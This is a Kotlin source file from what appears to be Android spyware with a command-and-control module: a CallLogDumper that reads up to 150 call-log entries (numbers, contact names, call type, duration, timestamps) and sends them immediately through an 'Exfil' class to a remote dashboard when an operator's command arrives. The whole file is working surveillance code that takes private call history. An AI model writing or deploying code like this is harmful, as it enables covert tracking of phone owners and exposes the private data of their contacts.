package com.sp.core.services

import android.content.Context
import android.provider.CallLog
import android.util.Log
import com.sp.core.c2.Exfil
import org.json.JSONArray
import org.json.JSONObject

/**
 * Call history dump.
 *
 * READ_CALL_LOG is an optional permission - if it was not granted the query
 * throws and the dashboard simply shows no calls (never a crash).
 */
object CallLogDumper {

    private const val TAG = "CallLogDumper"
    private const val LIMIT = 150

    fun dump(ctx: Context): Int {
        val items = JSONArray()
        try {
            val cols = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE
            )
            val uri = CallLog.Calls.CONTENT_URI
            ctx.contentResolver.query(uri, cols, null, null,
                CallLog.Calls.DATE + " DESC LIMIT $LIMIT")?.use { c ->
                val iId = c.getColumnIndex(CallLog.Calls._ID)
                val iNum = c.getColumnIndex(CallLog.Calls.NUMBER)
                val iName = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val iType = c.getColumnIndex(CallLog.Calls.TYPE)
                val iDur = c.getColumnIndex(CallLog.Calls.DURATION)
                val iDate = c.getColumnIndex(CallLog.Calls.DATE)
                while (c.moveToNext()) {
                    val o = JSONObject()
                    o.put("id", if (iId >= 0) c.getLong(iId) else 0)
                    o.put("number", if (iNum >= 0) c.getString(iNum) ?: "" else "")
                    o.put("name", if (iName >= 0) c.getString(iName) ?: "" else "")
                    o.put("type", typeName(if (iType >= 0) c.getInt(iType) else 0))
                    o.put("duration", if (iDur >= 0) c.getLong(iDur) else 0)
                    o.put("ts", if (iDate >= 0) c.getLong(iDate) else 0)
                    items.put(o)
                }
            }
        } catch (t: Throwable) {
            Log.w(TAG, "call log unavailable: ${t.message}")
        }
        if (items.length() == 0) return 0
        // Immediate send - a command result must not wait for the 45-minute
        // batch, the dashboard reacts at once.
        Exfil.sendLog(ctx, "call", items.toString())
        return items.length()
    }

    private fun typeName(t: Int): String = when (t) {
        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
        CallLog.Calls.MISSED_TYPE -> "MISSED"
        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
        else -> "UNKNOWN"
    }
}
